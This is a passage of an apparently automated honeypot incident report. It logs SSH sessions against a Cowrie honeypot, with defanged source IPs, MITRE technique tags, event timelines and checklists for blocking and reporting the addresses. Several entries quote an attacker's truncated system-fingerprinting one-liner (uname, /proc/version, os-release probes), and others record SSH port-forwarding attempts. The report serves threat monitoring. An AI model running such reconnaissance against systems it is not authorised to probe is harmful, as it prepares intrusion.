| `2026-08-20 17:42:27` | `cowrie.command.input` |
| `2026-08-20 17:42:27` | `cowrie.command.input` |
| `2026-08-20 17:42:27` | `cowrie.log.closed` |
| `2026-08-20 17:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b781ddbd5331

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:44 |
| **Last Seen** | 2026-08-20 17:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:44:15` | `cowrie.session.connect` |
| `2026-08-20 17:44:15` | `cowrie.client.version` |
| `2026-08-20 17:44:15` | `cowrie.client.kex` |
| `2026-08-20 17:44:16` | `cowrie.login.success` |
| `2026-08-20 17:44:17` | `cowrie.session.params` |
| `2026-08-20 17:44:17` | `cowrie.command.input` |
| `2026-08-20 17:44:17` | `cowrie.command.input` |
| `2026-08-20 17:44:17` | `cowrie.command.input` |
| `2026-08-20 17:44:17` | `cowrie.command.input` |
| `2026-08-20 17:44:17` | `cowrie.command.input` |
| `2026-08-20 17:44:17` | `cowrie.command.success` |
| `2026-08-20 17:44:17` | `cowrie.command.input` |
| `2026-08-20 17:44:17` | `cowrie.command.input` |
| `2026-08-20 17:44:17` | `cowrie.command.input` |
| `2026-08-20 17:44:17` | `cowrie.command.input` |
| `2026-08-20 17:44:18` | `cowrie.log.closed` |
| `2026-08-20 17:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef06b60deb9a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:45 |
| **Last Seen** | 2026-08-20 17:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:45:48` | `cowrie.session.connect` |
| `2026-08-20 17:45:48` | `cowrie.client.version` |
| `2026-08-20 17:45:48` | `cowrie.client.kex` |
| `2026-08-20 17:45:50` | `cowrie.login.success` |
| `2026-08-20 17:45:51` | `cowrie.session.params` |
| `2026-08-20 17:45:51` | `cowrie.command.input` |
| `2026-08-20 17:45:51` | `cowrie.command.input` |
| `2026-08-20 17:45:51` | `cowrie.command.input` |
| `2026-08-20 17:45:51` | `cowrie.command.input` |
| `2026-08-20 17:45:51` | `cowrie.command.input` |
| `2026-08-20 17:45:51` | `cowrie.command.success` |
| `2026-08-20 17:45:51` | `cowrie.command.input` |
| `2026-08-20 17:45:51` | `cowrie.command.input` |
| `2026-08-20 17:45:51` | `cowrie.command.input` |
| `2026-08-20 17:45:51` | `cowrie.command.input` |
| `2026-08-20 17:45:51` | `cowrie.log.closed` |
| `2026-08-20 17:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aca5a2afc5e4

| Field | Detail |
|---|---|
| **Source IP** | `61.2.44[.]54` |
| **First Seen** | 2026-08-20 17:46 |
| **Last Seen** | 2026-08-20 17:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:46:11` | `cowrie.session.connect` |
| `2026-08-20 17:46:12` | `cowrie.client.version` |
| `2026-08-20 17:46:12` | `cowrie.client.kex` |
| `2026-08-20 17:46:14` | `cowrie.login.success` |
| `2026-08-20 17:46:14` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.44[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.2.44[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ec0dedafad8

| Field | Detail |
|---|---|
| **Source IP** | `138.118.213[.]68` |
| **First Seen** | 2026-08-20 17:46 |
| **Last Seen** | 2026-08-20 17:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:46:20` | `cowrie.session.connect` |
| `2026-08-20 17:46:21` | `cowrie.client.version` |
| `2026-08-20 17:46:21` | `cowrie.client.kex` |
| `2026-08-20 17:46:23` | `cowrie.login.success` |
| `2026-08-20 17:46:23` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.118.213[.]68` to AbuseIPDB if not already reported
- [ ] Block `138.118.213[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e433cc4ae875

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:47 |
| **Last Seen** | 2026-08-20 17:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:47:19` | `cowrie.session.connect` |
| `2026-08-20 17:47:19` | `cowrie.client.version` |
| `2026-08-20 17:47:19` | `cowrie.client.kex` |
| `2026-08-20 17:47:21` | `cowrie.login.success` |
| `2026-08-20 17:47:22` | `cowrie.session.params` |
| `2026-08-20 17:47:22` | `cowrie.command.input` |
| `2026-08-20 17:47:22` | `cowrie.command.input` |
| `2026-08-20 17:47:22` | `cowrie.command.input` |
| `2026-08-20 17:47:22` | `cowrie.command.input` |
| `2026-08-20 17:47:22` | `cowrie.command.input` |
| `2026-08-20 17:47:22` | `cowrie.command.success` |
| `2026-08-20 17:47:22` | `cowrie.command.input` |
| `2026-08-20 17:47:22` | `cowrie.command.input` |
| `2026-08-20 17:47:22` | `cowrie.command.input` |
| `2026-08-20 17:47:22` | `cowrie.command.input` |
| `2026-08-20 17:47:23` | `cowrie.log.closed` |
| `2026-08-20 17:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d868357d5ca

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:48 |
| **Last Seen** | 2026-08-20 17:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:48:46` | `cowrie.session.connect` |
| `2026-08-20 17:48:47` | `cowrie.client.version` |
| `2026-08-20 17:48:47` | `cowrie.client.kex` |
| `2026-08-20 17:48:48` | `cowrie.login.success` |
| `2026-08-20 17:48:49` | `cowrie.session.params` |
| `2026-08-20 17:48:49` | `cowrie.command.input` |
| `2026-08-20 17:48:49` | `cowrie.command.input` |
| `2026-08-20 17:48:49` | `cowrie.command.input` |
| `2026-08-20 17:48:49` | `cowrie.command.input` |
| `2026-08-20 17:48:49` | `cowrie.command.input` |
| `2026-08-20 17:48:49` | `cowrie.command.success` |
| `2026-08-20 17:48:49` | `cowrie.command.input` |
| `2026-08-20 17:48:49` | `cowrie.command.input` |
| `2026-08-20 17:48:49` | `cowrie.command.input` |
| `2026-08-20 17:48:49` | `cowrie.command.input` |
| `2026-08-20 17:48:50` | `cowrie.log.closed` |
| `2026-08-20 17:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2abaa4e87a4b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 17:50 |
| **Last Seen** | 2026-08-20 17:55 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:50:11` | `cowrie.session.connect` |
| `2026-08-20 17:50:11` | `cowrie.client.version` |
| `2026-08-20 17:50:12` | `cowrie.client.kex` |
| `2026-08-20 17:50:14` | `cowrie.login.success` |
| `2026-08-20 17:50:16` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31875b4b8dc6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:50 |
| **Last Seen** | 2026-08-20 17:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:50:14` | `cowrie.session.connect` |
| `2026-08-20 17:50:15` | `cowrie.client.version` |
| `2026-08-20 17:50:15` | `cowrie.client.kex` |
| `2026-08-20 17:50:16` | `cowrie.login.success` |
| `2026-08-20 17:50:18` | `cowrie.session.params` |
| `2026-08-20 17:50:18` | `cowrie.command.input` |
| `2026-08-20 17:50:18` | `cowrie.command.input` |
| `2026-08-20 17:50:18` | `cowrie.command.input` |
| `2026-08-20 17:50:18` | `cowrie.command.input` |
| `2026-08-20 17:50:18` | `cowrie.command.input` |
| `2026-08-20 17:50:18` | `cowrie.command.success` |
| `2026-08-20 17:50:18` | `cowrie.command.input` |
| `2026-08-20 17:50:18` | `cowrie.command.input` |
| `2026-08-20 17:50:18` | `cowrie.command.input` |
| `2026-08-20 17:50:18` | `cowrie.command.input` |
| `2026-08-20 17:50:18` | `cowrie.log.closed` |
| `2026-08-20 17:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3609d1e48cec

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 17:50 |
| **Last Seen** | 2026-08-20 17:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:50:38` | `cowrie.session.connect` |
| `2026-08-20 17:50:40` | `cowrie.client.version` |
| `2026-08-20 17:50:40` | `cowrie.client.kex` |
| `2026-08-20 17:50:41` | `cowrie.login.success` |
| `2026-08-20 17:50:41` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:50:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 17:50:41` | `cowrie.direct-tcpip.data` |
| `2026-08-20 17:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fd5453116f4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:51 |
| **Last Seen** | 2026-08-20 17:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:51:42` | `cowrie.session.connect` |
| `2026-08-20 17:51:42` | `cowrie.client.version` |
| `2026-08-20 17:51:42` | `cowrie.client.kex` |
| `2026-08-20 17:51:43` | `cowrie.login.success` |
| `2026-08-20 17:51:44` | `cowrie.session.params` |
| `2026-08-20 17:51:44` | `cowrie.command.input` |
| `2026-08-20 17:51:44` | `cowrie.command.input` |
| `2026-08-20 17:51:44` | `cowrie.command.input` |
| `2026-08-20 17:51:44` | `cowrie.command.input` |
| `2026-08-20 17:51:44` | `cowrie.command.input` |
| `2026-08-20 17:51:44` | `cowrie.command.success` |
| `2026-08-20 17:51:44` | `cowrie.command.input` |
| `2026-08-20 17:51:44` | `cowrie.command.input` |
| `2026-08-20 17:51:44` | `cowrie.command.input` |
| `2026-08-20 17:51:44` | `cowrie.command.input` |
| `2026-08-20 17:51:45` | `cowrie.log.closed` |
| `2026-08-20 17:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0a2c90bc99d

| Field | Detail |
|---|---|
| **Source IP** | `42.202.32[.]73` |
| **First Seen** | 2026-08-20 17:52 |
| **Last Seen** | 2026-08-20 17:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:52:53` | `cowrie.session.connect` |
| `2026-08-20 17:52:53` | `cowrie.client.version` |
| `2026-08-20 17:52:53` | `cowrie.client.kex` |
| `2026-08-20 17:52:54` | `cowrie.login.success` |
| `2026-08-20 17:52:55` | `cowrie.session.params` |
| `2026-08-20 17:52:55` | `cowrie.command.input` |
| `2026-08-20 17:52:56` | `cowrie.log.closed` |
| `2026-08-20 17:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.202.32[.]73` to AbuseIPDB if not already reported
- [ ] Block `42.202.32[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8215e1df0e4b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:53 |
| **Last Seen** | 2026-08-20 17:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:53:12` | `cowrie.session.connect` |
| `2026-08-20 17:53:12` | `cowrie.client.version` |
| `2026-08-20 17:53:12` | `cowrie.client.kex` |
| `2026-08-20 17:53:13` | `cowrie.login.success` |
| `2026-08-20 17:53:14` | `cowrie.session.params` |
| `2026-08-20 17:53:14` | `cowrie.command.input` |
| `2026-08-20 17:53:14` | `cowrie.command.input` |
| `2026-08-20 17:53:14` | `cowrie.command.input` |
| `2026-08-20 17:53:14` | `cowrie.command.input` |
| `2026-08-20 17:53:14` | `cowrie.command.input` |
| `2026-08-20 17:53:14` | `cowrie.command.success` |
| `2026-08-20 17:53:14` | `cowrie.command.input` |
| `2026-08-20 17:53:14` | `cowrie.command.input` |
| `2026-08-20 17:53:14` | `cowrie.command.input` |
| `2026-08-20 17:53:14` | `cowrie.command.input` |
| `2026-08-20 17:53:15` | `cowrie.log.closed` |
| `2026-08-20 17:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4476a2d0d2a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:54 |
| **Last Seen** | 2026-08-20 17:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:54:47` | `cowrie.session.connect` |
| `2026-08-20 17:54:47` | `cowrie.client.version` |
| `2026-08-20 17:54:47` | `cowrie.client.kex` |
| `2026-08-20 17:54:47` | `cowrie.login.success` |
| `2026-08-20 17:54:49` | `cowrie.session.params` |
| `2026-08-20 17:54:49` | `cowrie.command.input` |
| `2026-08-20 17:54:49` | `cowrie.command.input` |
| `2026-08-20 17:54:49` | `cowrie.command.input` |
| `2026-08-20 17:54:49` | `cowrie.command.input` |
| `2026-08-20 17:54:49` | `cowrie.command.input` |
| `2026-08-20 17:54:49` | `cowrie.command.success` |
| `2026-08-20 17:54:49` | `cowrie.command.input` |
| `2026-08-20 17:54:49` | `cowrie.command.input` |
| `2026-08-20 17:54:49` | `cowrie.command.input` |
| `2026-08-20 17:54:49` | `cowrie.command.input` |
| `2026-08-20 17:54:50` | `cowrie.log.closed` |
| `2026-08-20 17:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb5605769988

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:56 |
| **Last Seen** | 2026-08-20 17:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:56:31` | `cowrie.session.connect` |
| `2026-08-20 17:56:31` | `cowrie.client.version` |
| `2026-08-20 17:56:31` | `cowrie.client.kex` |
| `2026-08-20 17:56:31` | `cowrie.login.success` |
| `2026-08-20 17:56:32` | `cowrie.session.params` |
| `2026-08-20 17:56:32` | `cowrie.command.input` |
| `2026-08-20 17:56:32` | `cowrie.command.input` |
| `2026-08-20 17:56:32` | `cowrie.command.input` |
| `2026-08-20 17:56:32` | `cowrie.command.input` |
| `2026-08-20 17:56:32` | `cowrie.command.input` |
| `2026-08-20 17:56:32` | `cowrie.command.success` |
| `2026-08-20 17:56:32` | `cowrie.command.input` |
| `2026-08-20 17:56:32` | `cowrie.command.input` |
| `2026-08-20 17:56:32` | `cowrie.command.input` |
| `2026-08-20 17:56:32` | `cowrie.command.input` |
| `2026-08-20 17:56:32` | `cowrie.log.closed` |
| `2026-08-20 17:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1c8c727fac8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:58 |
| **Last Seen** | 2026-08-20 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
